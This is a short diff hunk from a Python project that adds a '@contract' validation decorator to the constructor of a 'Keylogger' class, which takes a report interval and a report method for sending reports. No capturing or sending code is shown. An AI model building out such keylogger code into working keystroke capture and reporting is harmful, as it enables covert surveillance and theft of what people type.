@@ -20,6 +20,7 @@ def validationCheckReportMethod(x):
 
 
 class Keylogger:
+    @contract
     def __init__(self, interval=3600, report_method="file"):
         """
         :param interval: Time interval between sending reports (in seconds).
